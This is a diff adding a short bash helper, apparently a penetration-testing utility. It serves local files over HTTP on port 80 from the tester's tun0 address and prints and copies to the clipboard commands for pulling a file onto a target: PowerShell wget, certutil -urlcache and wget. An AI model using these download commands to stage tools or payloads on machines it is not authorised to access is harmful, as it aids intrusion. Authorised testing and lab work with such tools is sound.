@@ -1,0 +1,36 @@
+#!/bin/bash
+
+IP=$( tun0 )
+if [ -z $IP ]; then
+	IP="<IP>"
+fi
+
+
+if [ -z $1 ]; then
+	FILE="<file>"
+else
+	FILE=$1
+fi
+
+echo ""
+echo "Commands:"
+echo "---------"
+echo "[*] powershell.exe wget http://$IP/$FILE -OutFile $FILE (copied to clipboard)"
+echo "[*] certutil -urlcache -f http://$IP/$FILE $FILE"
+echo "[*] wget http://$IP/$FILE"
+echo ""
+
+echo -n "powershell.exe wget http://$IP/$FILE -OutFile $FILE" | xclip -selection c
+
+if [ -z $1 ]; then
+	echo "Files:"
+	echo "------"
+	for F in $( ls ); do
+		echo -n "$F  "
+	done
+	echo -e "\n"
+fi
+
+echo "Serving:"
+echo "--------"
+python3 -m http.server 80
